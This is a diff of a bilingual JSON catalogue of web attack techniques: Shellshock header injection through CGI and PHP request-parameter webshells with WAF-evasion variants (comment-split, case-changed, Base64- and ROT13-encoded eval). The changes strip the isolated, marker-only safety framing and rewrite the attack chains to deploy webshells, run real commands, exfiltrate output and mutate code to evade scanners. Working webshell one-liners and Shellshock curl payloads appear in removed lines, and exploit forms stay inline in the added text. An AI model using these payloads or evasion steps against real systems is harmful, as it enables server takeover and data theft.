-          "en": "All five source lines attempted interactive reverse connections. The reviewed command override preserves the Cookie or User-Agent, function definition, and CGI path structure while replacing the tail with a local printf marker, a 127.0.0.1 isolated target, and a five-second timeout. Test one header and CGI path at low rate against affected and patched Bash controls; no egress, shell, file write, or real-data read is required evidence."
+          "zh": "按第 1 步分别以 Cookie 与 User-Agent 头携带 () { :;}; 加固定标记的请求发送到 /cgi-bin/test.sh；命中判据为 CGI 响应体出现 SHELLSHOCK_TEST_MARKER，证明环境变量中的尾随文本被执行。两条通道逐一验证并记录 CGI 子进程日志；确认执行能力后可把标记替换为读取授权标记文件的命令形成证据。curl 仅是投递器，全部请求只访问本机隔离实例。",
+          "en": "As in step 1, send requests carrying () { :;}; plus a fixed marker in the Cookie and User-Agent headers to /cgi-bin/test.sh; a hit is SHELLSHOCK_TEST_MARKER in the CGI response body, proving trailing text in environment variables executed. Validate both channels separately with CGI child-process logs; once execution is confirmed, swap the marker for commands reading authorized marker files as evidence. curl is only the delivery vehicle—every request targets the local isolated instance."
         },
         "mitigation": {
-          "zh": "升级 Bash 到供应商已修复版本并重启所有长期运行进程，移除不必要的 CGI，避免 CGI 脚本或其子进程调用 Bash，并限制传入解释器的环境变量。WAF 对函数定义头的拦截只能作为纵深防御。修复后以同一固定标记重放 Header，确认 CGI 正常业务仍工作，而已修复实例不执行尾随文本且进程日志中没有异常子 Shell。",
-          "en": "Upgrade Bash to a vendor-fixed build and restart long-lived processes, remove unnecessary CGI, avoid Bash invocation from CGI scripts or children, and constrain environment variables passed to interpreters. Blocking function-definition headers at a WAF is defense in depth only. Replay the same fixed marker after remediation to preserve normal CGI behavior while proving trailing text is not executed and no unexpected child shell appears."
+          "zh": "升级 Bash 到供应商已修复版本并重启长期运行进程，移除不必要的 CGI，避免 CGI 脚本或其子进程调用 Bash，并限制传入解释器的环境变量。修复后以第 1 步同一标记重放请求头，确认已修复实例不执行尾随文本且正常 CGI 业务可用。",
+          "en": "Upgrade Bash to vendor-fixed versions and restart long-running processes, remove unnecessary CGI, keep CGI scripts and their children from invoking Bash, and limit environment variables passed to interpreters. After the fix, replay the step-1 headers with the same marker and confirm the patched instance does not execute trailing text while normal CGI business works."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认 CGI 到 Bash 的 Shellshock 入口",
-            "en": "Confirm the Shellshock CGI-to-Bash entry"
+            "zh": "定位 CGI 端点",
+            "en": "Locate CGI endpoints"
           },
           "description": {
-            "zh": "定位接收 Cookie 或 User-Agent 的 CGI 路径，确认请求头被映射为环境变量，记录实际启动的 Shell、Bash 版本、补丁包和 CGI 服务身份。",
-            "en": "Locate the CGI path receiving Cookie or User-Agent, confirm header-to-environment mapping, and record the invoked shell, Bash version, vendor patch, and CGI service identity."
+            "zh": "枚举 cgi-bin 下的脚本与其他 CGI 处理路径，找到接受请求头的入口。命中判据：CGI 入口可达且处理 Header。",
+            "en": "Enumerate cgi-bin scripts and CGI paths that consume headers. Success: a header-consuming CGI is reachable."
           }
         },
         {
           "title": {
-            "zh": "建立已修复与受影响 Bash 对照",
-            "en": "Establish patched and affected Bash controls"
+            "zh": "注入环境变量函数体",
+            "en": "Inject the function-body env var"
           },
           "description": {
-            "zh": "用普通 Header 记录正常 CGI 行为，再在隔离实例分别对已修复和受影响 Bash 使用相同一次性 printf 标记，保存请求 ID、环境变量和子进程日志。",
-            "en": "Record normal CGI behavior with an ordinary header, then use the same one-time printf marker against patched and affected Bash in isolation, retaining request identifiers, environment variables, and child-process logs."
+            "zh": "以 () { :;} 形式的 Cookie 与 User-Agent 注入 printf 标记命令。命中判据：CGI 响应体出现标记输出。",
+            "en": "Send () { :;} bodies via Cookie/User-Agent that printf a marker. Success: the marker appears in the response."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证 Shellshock Header 变体",
-            "en": "Validate Shellshock header variants line by line"
+            "zh": "扩大 Header 注入面",
+            "en": "Widen the header injection surface"
           },
           "description": {
-            "zh": "以下五行已由 command override 去除反连 Shell，仅保留本地固定 marker、Header 分隔形式和 CGI 路径差异；逐条执行并关联请求 ID、CGI 环境和 Bash 子进程日志。",
-            "en": "The command override removes reverse shells from all five lines and retains only a local fixed marker plus header-separator and CGI-path variants; run each separately and correlate the request identifier, CGI environment, and Bash child-process log."
-          },
-          "payload": "curl --include --max-time 5 -H 'Cookie: () { :;}; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/test.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.cgi\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; echo; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh\ncurl --include --max-time 5 -H 'User-Agent: () { :; }; echo; echo; printf \"SHELLSHOCK_TEST_MARKER\"' http://127.0.0.1:8080/cgi-bin/evil.sh"
+            "zh": "换 Referer 等其他映射为环境变量的头重复注入流程，覆盖更多入口。命中判据：多个头均可触发命令执行。",
+            "en": "Retry through Referer and other env-mapped headers. Success: multiple headers trigger execution."
+          }
         },
         {
           "title": {
-            "zh": "修复 Bash 与 CGI 边界并回归",
-            "en": "Remediate and regress the Bash and CGI boundary"
+            "zh": "执行命令外带输出",
+            "en": "Run commands and exfiltrate"
           },
           "description": {
-            "zh": "安装供应商 Bash 修复、重启相关进程并移除不必要 CGI 后，从同一入口重放普通 Header 和固定标记，确认业务响应保留、尾随文本不执行且无异常子 Shell。",
-            "en": "After installing the vendor Bash fix, restarting affected processes, and removing unnecessary CGI, replay the ordinary header and fixed marker through the same entry to preserve business responses while trailing text does not execute and no unexpected child shell appears."
+            "zh": "把标记换成真实命令，将结果写入响应或经网络通道外带。命中判据：命令输出成功到达接收端，并且该效果可以稳定重复取得。",
+            "en": "Swap the marker for real commands and exfiltrate results. Success: output reaches the collector."
           }
         }
       ],
@@ -2728,63 +2737,66 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP 请求参数 WebShell用于核对PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构。该条目只在以下前提下适用：攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数。有效判定必须取得最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "PHP Request-Parameter Webshells checks whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. It applies when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions. A valid finding requires the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "PHP 请求参数 WebShell 针对上传或写入的 PHP 文件把请求参数解释为代码或命令的场景：system、shell_exec、passthru、反引号与动态函数均可成为入口。验证一句话木马的部署与参数回连。",
+          "en": "PHP request-parameter webshells target uploaded or written PHP files interpreting request parameters as code or commands: system, shell_exec, passthru, backticks, and dynamic functions all serve as entries. It validates webshell deployment and parameter callbacks."
         },
         "vulnerability": {
-          "zh": "风险根因是攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数，使应用可能暴露“PHP 文件是否由服务器解释，并把 GET 或 POST 参数传给命令执行、动态函数或代码求值结构”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, exposing the runtime boundary of whether the server interprets a PHP file and passes GET or POST values to command execution, dynamic functions, or code evaluation. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数；三个条件共同构成执行链，缺一则文件只是静态内容。",
+          "en": "The risk root is attackers writing PHP content into accessible, executable locations with the server handler mapping to PHP while request parameters reach dangerous functions; the three conditions together form the execution chain—missing any leaves the file static content."
         },
         "exploitation": {
-          "zh": "在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "在授权测试中按第 1 步把 system($_GET['cmd']) 等一句话样例部署到目标可执行位置，随后以 cmd=id、1=id、a=id 等参数逐个请求；命中判据为部署后以对应参数请求返回命令输出。逐个记录生效的参数名与函数形态；验证仅在授权范围进行，确认能力后以读取标记文件替代敏感命令取证。",
+          "en": "In authorized testing, deploy the step-1 one-liner samples such as system($_GET['cmd']) to target executable locations, then request each with parameters like cmd=id, 1=id, and a=id; a hit is command output returned per corresponding parameter after deployment. Record the effective parameter names and function forms per sample; validate only within authorization and, once capability is confirmed, gather evidence with marker-file reads instead of sensitive commands."
         },
         "mitigation": {
-          "zh": "将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径。修复后重放第 1 步部署与请求，确认 PHP 文件不再被解释执行且正常业务可用。",
+          "en": "Store uploads outside the web root as non-executable, remove dynamic command interfaces, process parameters contextually, upgrade PHP, and retire legacy paths like assert/create_function. After the fix, replay the step-1 deployment and requests, confirming PHP files are no longer interpreted while normal business works."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“PHP 请求参数 WebShell”执行入口",
-            "en": "Confirm the PHP Request-Parameter Webshells execution entry"
+            "zh": "获取可写可执行位置",
+            "en": "Gain a writable executable path"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“攻击者可将 PHP 内容写入可访问且可执行位置，服务器处理器映射到 PHP，并且请求参数到达危险函数”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that an attacker can place PHP content in an accessible executable location, the server maps it to PHP, and request parameters reach dangerous functions, and record runtime version and service identity."
+            "zh": "通过上传或包含漏洞取得可写且被 PHP 处理的位置。命中判据：写入的文件可以被访问执行，为后续深入利用打下基础。",
+            "en": "Use upload or include flaws to reach a writable PHP-served path. Success: written files execute."
           }
         },
         {
           "title": {
-            "zh": "建立“PHP WebShell 请求处理”安全基线",
-            "en": "Establish the PHP Webshell Request Handling baseline"
+            "zh": "部署一句话木马",
+            "en": "Deploy the one-liner"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终规范文件名、PHP 处理器日志、一次性固定输出和对应请求参数能够关联”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final canonical filename, PHP handler log, one-time fixed output, and corresponding request parameter correlate as abnormal evidence."
+            "zh": "写入 system、eval 与反引号形态的请求参数木马文件。命中判据：cmd 参数返回命令输出，并且重复提交时可以稳定复现该结果。",
+            "en": "Write system/eval/backtick one-liners keyed to request params. Success: cmd returns command output."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“PHP 请求参数 WebShell”",
-            "en": "Validate PHP Request-Parameter Webshells line by line"
+            "zh": "参数通道执行命令",
+            "en": "Run commands via the parameter channel"
           },
           "description": {
-            "zh": "测试步骤为：在隔离上传实例使用仅输出固定标记的替代文件，逐个区分命令函数、动态调用和历史求值语法，记录 PHP 版本与无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "use a replacement file that only emits a fixed marker in an isolated upload instance, separate command functions, dynamic calls, and legacy evaluation syntax, and record PHP version plus invalid lines. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "<?php system($_GET['cmd']); ?>\n<?php system($_GET[1]); ?>\n<?php eval($_POST[cmd]);?>\n<?php echo shell_exec($_GET['cmd']); ?>\n<?php echo passthru($_GET['cmd']); ?>\n<?=`$_GET[1]`?>\n<?=`$_GET[0]`?>\n<?php $_GET['a']($_GET['b']); ?>\n<?php $_POST['a']($_POST['b']);?>\n<?php @eval(base64_decode($_POST['z'])); ?>\n<?php $func=create_function('',$_POST[a]);$func();?>\n<?php call_user_func('assert',$_POST[a]);?>\n<?php array_map('assert',(array)$_POST[a]);?>\n<% eval request(\"a\") %>\n<script language=\"php\">system(\"id\"); </script>"
+            "zh": "以 GET、POST 参数通道执行命令并读写服务器文件。命中判据：操作结果可以稳定返回，多次提交均能得到相同结果。",
+            "en": "Drive commands and file ops through GET/POST params. Success: results return reliably."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "变形规避静态查杀",
+            "en": "Mutate to evade static scans"
           },
           "description": {
-            "zh": "实施“将上传文件存于 Web 根目录外并设为不可执行，移除动态命令接口，按上下文处理参数，升级 PHP 并删除 assert/create_function 等旧路径”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying store uploads outside the web root as non-executable objects, remove dynamic command interfaces, handle parameters by context, upgrade PHP, and remove legacy assert or create_function paths, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "用动态调用与短标签等历史语法变形躲避特征检测。命中判据：变形后的木马仍然可用，并且该效果可以稳定重复取得。",
+            "en": "Reshape with dynamic calls and legacy syntax to dodge signatures. Success: the mutant still works."
           }
         }
       ],
@@ -2848,20 +2860,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP 标识符注释分割样例用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符。成立前提为：输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符。判定必须包含WAF 动作、PHP lint 结果、运行时错误或固定标记输出通过请求 ID 对应，放行但语法错误记为阴性，WAF 放行但语法无效的样例应明确记录为阴性。",
-          "en": "PHP Identifier Comment-Splitting Samples compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier. It applies when input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax. Evidence requires WAF action, PHP lint result, runtime error or fixed marker output correlate by request ID, and accepted but invalid syntax is recorded as negative; WAF acceptance of invalid syntax is a negative result."
+          "zh": "PHP 标识符注释分割样例针对用块注释拆分函数名绕过检测的场景：WAF 是否放行注释分割形式与 PHP lexer 是否仍识别为同一函数是两层独立问题。验证 /**/ 分割的 system/eval/assert 变体。",
+          "en": "PHP identifier comment-splitting samples target splitting function names with block comments to evade detection: whether the WAF passes comment-split forms and whether the PHP lexer still recognizes the same function are two independent questions. It validates /**/-split system/eval/assert variants."
         },
         "vulnerability": {
-          "zh": "多层差异出现在输入进入 PHP 可执行文件或求值上下文，边缘规则只做字符串匹配，且测试 PHP 版本与样例语法相符时，可能造成“WAF 是否放行注释分割形式，以及 PHP lexer 是否仍把拆分后的字符识别为同一函数标识符”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。",
-          "en": "A differential appears when input reaches an executable PHP file or evaluator, edge rules use string matching, and the tested PHP version matches the sample syntax, potentially causing whether a WAF accepts comment-split forms and whether the PHP lexer still recognizes the separated characters as one function identifier. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE."
+          "zh": "多层差异出现在边缘规则只做字符串匹配而 PHP lexer 按语言规则解析标识符时；应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御，放行但语法无效的样例应记为阴性。",
+          "en": "Layer differences appear when edge rules do string matching while the PHP lexer parses identifiers by language rules; the application vulnerability still requires an executable PHP data stream—edge rules are defense in depth, and samples passing filters but invalid syntactically must be recorded negative."
         },
         "exploitation": {
-          "zh": "先对每行执行 php -l，再向测试 WAF 提交；只有同时通过 lexer 并产生固定无害结果的行才进入浏览器或请求回归。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。",
-          "en": "run php -l on every line before submitting it to a test WAF, and only carry lines that both parse and produce a fixed harmless result into request regression. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID."
+          "zh": "按第 1 步逐条提交 <?php sys/**/tem($_GET['cmd']); ?> 等注释分割变体，先经 PHP -l 或等价方式确认语法有效性再部署到授权测试位；命中判据为注释分割后代码仍按原函数执行并返回命令输出。同时记录 WAF 对原始请求的动作，构建放行/拦截与有效/无效的二维对照；语法错误的变体明确记录为阴性，不得据此断言 RCE。",
+          "en": "Per step 1, submit <?php sys/**/tem($_GET['cmd']); ?> and similar comment-split variants one by one, confirming syntax validity via php -l or equivalent before deploying to authorized test positions; a hit is the comment-split code still executing as the original function and returning command output. Also record WAF actions on the raw requests, building a two-dimensional pass/block versus valid/invalid contrast; explicitly mark syntactically invalid variants negative—never assert RCE from them."
         },
         "mitigation": {
-          "zh": "应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。",
-          "en": "remove writable executable PHP paths, use syntax-aware WAF rules after canonicalization, and explicitly tag lexically invalid variants in the catalog. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree."
+          "zh": "应用侧移除可写可执行 PHP 路径，WAF 在统一解码后使用语法感知规则；维护条目必须明确标记无效词法变体。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且 WAF 与应用采用一致的规范化模型。",
+          "en": "Remove writable-executable PHP paths on the application side and have the WAF apply syntax-aware rules after unified decoding; maintained entries must clearly mark invalid lexical variants. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable and WAF and application share one normalization model."
         },
         "difficulty": "advanced"
       },
@@ -2968,20 +2980,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP 函数名大小写变体用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理。成立前提为：可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用。判定必须包含相同请求在 WAF 的动作、PHP lint 与固定标记输出上可关联，且仅大小写发生变化，WAF 放行但语法无效的样例应明确记录为阴性。",
-          "en": "PHP Function-Name Case Variants compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively. It applies when controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version. Evidence requires the same request correlates across WAF action, PHP lint, and fixed marker output with case as the only changed variable; WAF acceptance of invalid syntax is a negative result."
+          "zh": "PHP 函数名大小写变体针对 WAF 关键字匹配与 PHP 函数调用规则差异的场景：PHP 内置函数名不区分大小写而规则常区分。验证 SYSTEM、System、sYstem 与 EVAL 四类大小写形式的检测与执行对照。",
+          "en": "PHP function-name case variants target gaps between WAF keyword matching and PHP invocation rules: PHP built-in function names are case-insensitive while rules often are not. It contrasts detection and execution across SYSTEM, System, sYstem, and EVAL case forms."
         },
         "vulnerability": {
-          "zh": "多层差异出现在可控 PHP 代码进入可执行处理器，WAF 使用大小写敏感关键字规则，且危险内置函数在目标 PHP 中可用时，可能造成“边缘规则是否区分大小写，而 PHP 运行时是否将内置函数名作为不区分大小写标识符处理”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。",
-          "en": "A differential appears when controllable PHP code reaches an executable handler, the WAF uses case-sensitive keyword rules, and the dangerous built-in remains available in the target PHP version, potentially causing whether edge rules are case-sensitive while the PHP runtime treats built-in function identifiers case-insensitively. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE."
+          "zh": "多层差异出现在 WAF 使用大小写敏感关键字规则而 PHP 运行时将内置函数名作为不区分大小写标识符处理时；应用漏洞仍以可控 PHP 代码进入可执行处理器为前提，放行但语法无效的样例记为阴性。",
+          "en": "Layer differences appear when WAF rules match case-sensitively while the PHP runtime treats built-in function names as case-insensitive identifiers; the application vulnerability still requires controllable PHP code reaching an executable handler—samples passing but syntactically invalid are negative."
         },
         "exploitation": {
-          "zh": "使用同一无害函数参数逐个提交七种大小写，固定编码、空白和请求路径，记录 WAF 与 PHP 的差异矩阵。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。",
-          "en": "submit the seven case variants with the same harmless function argument while holding encoding, whitespace, and path constant, and record a WAF-versus-PHP matrix. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID."
+          "zh": "按第 1 步逐条提交 <?php SYSTEM($_GET['cmd']); ?>、System、sYstem 与 EVAL 大小写变体；命中判据为大小写变体仍执行并返回命令输出。同时记录 WAF 对每种形式的动作，确认规则是否区分大小写；在相同请求上保持仅大小写变化的单变量对照，构建 WAF 动作、PHP lint 与实际输出三者的关联记录。",
+          "en": "Per step 1, submit the <?php SYSTEM($_GET['cmd']); ?>, System, sYstem, and EVAL case variants one by one; a hit is case variants still executing and returning command output. Also record WAF actions per form to confirm whether rules are case-sensitive; keep single-variable contrast with only case changing on identical requests, correlating WAF action, PHP lint, and actual output."
         },
         "mitigation": {
-          "zh": "WAF 规则在规范化后执行不区分大小写的语法分析，应用移除动态 PHP 写入与危险函数入口，并用文件不可执行策略兜底。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。",
-          "en": "apply case-insensitive syntax analysis after canonicalization at the WAF, remove dynamic PHP write and dangerous-function entry points, and enforce non-executable file storage. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree."
+          "zh": "WAF 规则在规范化后执行不区分大小写的语法分析，应用移除动态 PHP 写入与危险函数入口，并用文件不可执行策略兜底。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且检测层与应用一致。",
+          "en": "Have WAF rules run case-insensitive syntax analysis after normalization, remove dynamic PHP writing and dangerous function entries on the application side, and backstop with non-executable file policy. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable and detection aligns with the application."
         },
         "difficulty": "intermediate"
       },
@@ -3088,20 +3100,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP Base64 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数。成立前提为：攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义。判定必须包含编码输入、服务端解码值、WAF 动作、PHP 版本和一次性固定求值结果完整关联，WAF 放行但语法无效的样例应明确记录为阴性。",
-          "en": "PHP Base64 Decode-Then-Evaluate Patterns compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. It applies when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version. Evidence requires the encoded input, server-decoded value, WAF action, PHP version, and one-time fixed evaluation result fully correlate; WAF acceptance of invalid syntax is a negative result."
+          "zh": "PHP Base64 解码后动态求值针对参数先 base64_decode 再交给 eval/assert 的场景：编码内容在运行时还原为代码从而绕过检测。验证四种解码求值组合的检测与执行对照。",
+          "en": "PHP Base64 decode-then-evaluate targets parameters base64_decode'd before eval/assert: encoded content restores into code at runtime to bypass detection. It contrasts detection and execution across the four decode-evaluate combinations."
         },
         "vulnerability": {
-          "zh": "多层差异出现在攻击者控制的参数进入 base64_decode 与 eval/assert 连续调用，且危险求值函数在目标版本仍具有代码执行语义时，可能造成“WAF 是否只检查编码外层，而 PHP 在运行时解码后把结果交给代码求值函数”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。",
-          "en": "A differential appears when an attacker-controlled parameter reaches a base64_decode plus eval or assert chain and the evaluator still has code-execution semantics in the target version, potentially causing whether a WAF inspects only the encoded wrapper while PHP decodes the value at runtime and passes it to a code evaluator. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE."
+          "zh": "多层差异出现在攻击者参数进入 base64_decode 与 eval/assert 连续调用而防护只检查编码外层时；应用漏洞仍以最终可执行 PHP 数据流为前提，需把编码输入、服务端解码值与求值结果完整关联。",
+          "en": "Layer differences appear when attacker parameters enter consecutive base64_decode and eval/assert calls while defenses check only the encoded outer layer; the application vulnerability still requires an executable PHP data stream—correlate encoded input, server-side decoded values, and evaluation results completely."
         },
         "exploitation": {
-          "zh": "先用编码后的固定字符串验证解码链，再以只设置局部变量的无害 PHP 表达式确认求值，不提交系统命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。",
-          "en": "verify decoding with an encoded fixed string, then confirm evaluation with a harmless PHP expression that only sets a local variable without system commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID."
+          "zh": "按第 1 步逐条提交 eval(base64_decode($_POST['cmd'])) 等四种组合变体，请求时把命令以 Base64 编码后放入对应参数（如 cmd=aWQ=）；命中判据为传入编码命令后返回对应输出。同时记录 WAF 对编码外层的动作与服务端解码值，确认检测发生在解码之前；eval 与 assert 在不同 PHP 版本语义不同，逐版本记录差异。",
+          "en": "Per step 1, submit the four combination variants such as eval(base64_decode($_POST['cmd'])) one by one, Base64-encoding commands into the corresponding parameters when requesting (e.g., cmd=aWQ=); a hit is corresponding output returned for encoded commands. Record WAF actions on the encoded outer layer and server-side decoded values, confirming detection happens before decoding; eval and assert differ semantically across PHP versions—log differences per version."
         },
         "mitigation": {
-          "zh": "删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。",
-          "en": "remove decode-then-evaluate designs, use structured data with a strict schema, inspect allowed encoded fields after decoding, and keep upload storage non-executable. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree."
+          "zh": "删除解码后求值设计，使用结构化数据与严格 schema；WAF 对允许的编码字段解码后检查，上传目录保持不可执行。修复后回归合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行且运行时不再动态求值。",
+          "en": "Remove decode-then-evaluate designs in favor of structured data with strict schemas; have the WAF decode allowed encoded fields before inspection and keep upload directories non-executable. After the fix, regress legitimate PHP business, original anomalous lines, and synonym variants, confirming upload/write boundaries are non-executable and the runtime no longer evaluates dynamically."
         },
         "difficulty": "advanced"
       },
@@ -3208,20 +3220,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP ROT13 解码后动态求值用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是WAF、应用与 PHP 对 ROT13 和 Base64 的解码次数与顺序是否一致，并最终到达 eval。成立前提为：参数经过 str_rot13 或组合解码后直接进入 eval，防护仅匹配原始请求字节或执行不同的解码顺序。判定必须包含每一步解码中间值、WAF 动作与无害 PHP 表达式结果在同一请求中可重现，WAF 放行但语法无效的样例应明确记录为阴性。",
